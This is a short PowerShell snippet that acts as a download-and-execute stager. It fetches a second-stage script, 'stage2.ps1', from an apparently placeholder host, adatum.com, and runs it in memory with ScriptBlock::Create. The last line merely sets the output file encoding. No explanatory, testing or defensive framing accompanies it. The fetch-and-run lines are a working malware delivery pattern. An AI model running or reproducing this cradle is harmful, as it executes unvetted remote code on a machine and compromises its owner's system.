$StageScript = (New-Object Net.WebClient).DownloadString("http://adatum.com/stage2.ps1")
& ([ScriptBlock]::Create($StageScript))
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
